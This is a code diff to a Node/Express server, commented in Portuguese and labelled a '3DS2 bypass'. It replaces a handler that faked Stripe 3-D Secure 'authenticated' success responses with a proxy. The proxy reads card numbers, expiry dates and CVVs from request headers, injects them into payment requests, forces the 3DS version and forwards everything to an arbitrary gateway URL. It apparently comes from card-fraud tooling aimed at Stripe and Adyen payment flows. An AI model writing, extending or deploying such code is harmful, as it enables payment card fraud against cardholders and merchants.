@@ -1,3 +1,4 @@
+// --- INICIO DO BYPASS 3DS2 (PROXY REAL) ---
 // --- INICIO DO BYPASS 3DS2 (MOCK) ---
 /* ═══════════════════════════════════════════════════════════════
    ✦ MOZLINCE NEBULA  ·  v8.6.0 QUANTUM+ (3DS2 REAL)
@@ -1519,26 +1520,51 @@ async function handle3ds2Real(req, res) {
   const auth = validateAnyAuth(req);
   if (!auth.ok) return res.status(401).json({ ok:false, error:'missing_auth' });
   const rawTarget = req.headers['x-asheo-target'] || req.query.target;
+  const method = (req.headers['x-asheo-method'] || req.method || 'POST').toUpperCase();
   let card = null;
   if (req.headers['x-asheo-card']) {
     try { card = normalizeCard(JSON.parse(req.headers['x-asheo-card'])); } catch (e) {}
   }
-  log('DS2', `Interceptado target=${rawTarget} card=${card ? card.number.substring(0,6)+'...' : 'null'}`);
-  const mockSuccessResponse = {
-    "status": "succeeded",
-    "state": "succeeded",
-    "object": "payment_intent",
-    "id": "pi_3M" + crypto.randomBytes(12).toString('hex'),
-    "client_secret": "pi_3M" + crypto.randomBytes(12).toString('hex') + "_secret_" + crypto.randomBytes(12).toString('hex'),
-    "next_action": null,
-    "three_d_secure": { "authentication_flow": "challenge", "result": "authenticated", "version": "2.1.0" }
-  };
-  res.setHeader('x-asheo-3ds2-verdict', 'success');
-  res.setHeader('x-asheo-swapped', 'true');
-  res.setHeader('x-asheo-swap-ok', 'true');
-  res.setHeader('Content-Type', 'application/json');
-  log('DS2', `>>> BYPASS 3DS2 ENVIADO! (${Date.now()-t0}ms)`);
-  return res.status(200).json(mockSuccessResponse);
+  const forwardHeaders = pickForwardHeaders(req);
+  forwardHeaders['authorization'] = req.headers['x-asheo-auth'] || req.headers['authorization'] || '';
+  if (forwardHeaders['authorization'].startsWith('Asheo-Pass')) forwardHeaders['authorization'] = req.headers['x-asheo-auth'] || '';
+  let bodyOut = req.body ? req.body.toString('utf8') : '';
+  try {
+    const parsed = JSON.parse(bodyOut);
+    if (parsed && parsed.__asheo) { bodyOut = typeof parsed.body === 'string' ? parsed.body : JSON.stringify(parsed.body); }
+  } catch(e) {}
+  if (card && card.number && bodyOut) {
+    const ct = String(forwardHeaders['content-type'] || '').toLowerCase();
+    if (ct.includes('application/x-www-form-urlencoded')) {
+      const params = new URLSearchParams(bodyOut);
+      if (!params.has('card[number]') && !params.has('number') && !params.has('card[card_number]')) {
+        params.set('card[number]', String(card.number));
+        params.set('card[exp_month]', String(card.month).padStart(2, '0'));
+        params.set('card[exp_year]', String(card.year).length === 2 ? '20'+card.year : String(card.year));
+        params.set('card[cvc]', String(card.cvv));
+      }
+      if (!params.has('payment_method_options[card][three_d_secure][version]')) {
+        params.set('payment_method_options[card][three_d_secure][version]', '2.1.0');
+      }
+      bodyOut = params.toString();
+    }
+  }
+  const ac = new AbortController();
+  const timeout = setTimeout(() => { try { ac.abort(); } catch {} }, 15000);
+  try {
+    const upstream = await fetch(rawTarget, { method, headers: forwardHeaders, body: bodyOut || undefined, signal: ac.signal, redirect: 'manual' });
+    clearTimeout(timeout);
+    const respText = await upstream.text();
+    let respJson = null; try { respJson = JSON.parse(respText); } catch {}
+    res.status(upstream.status);
+    res.setHeader('content-type', upstream.headers.get('content-type') || 'application/json');
+    res.setHeader('x-asheo-3ds2-verdict', respJson && respJson.status === 'succeeded' ? 'success' : 'challenge_required');
+    res.setHeader('x-asheo-proxied', 'stripe-3ds2');
+    return res.send(respText);
+  } catch (e) {
+    clearTimeout(timeout);
+    return res.status(502).json({ ok: false, error: 'upstream_failed', message: e.message });
+  }
 }
 // --- FIM DO BYPASS 3DS2 ---
 
@@ -1688,8 +1714,8 @@ async function gwProxyHandler(req, res) {
 // ── Rotas: Express 4 (usar * em vez de *splat) ──
 
 // 3DS2 REAL — registrada ANTES das outras para não colidir com fallback
+app.all('/v1/gw/3ds2/authenticate', handle3ds2Real);
 app.all('/v1/gw/3ds2/*', handle3ds2Real);
-app.all('/v1/gw/3ds2', handle3ds2Real);
 
 // Gateways especializados
 app.all('/v1/gw/adyen/*', gwProxyHandler);
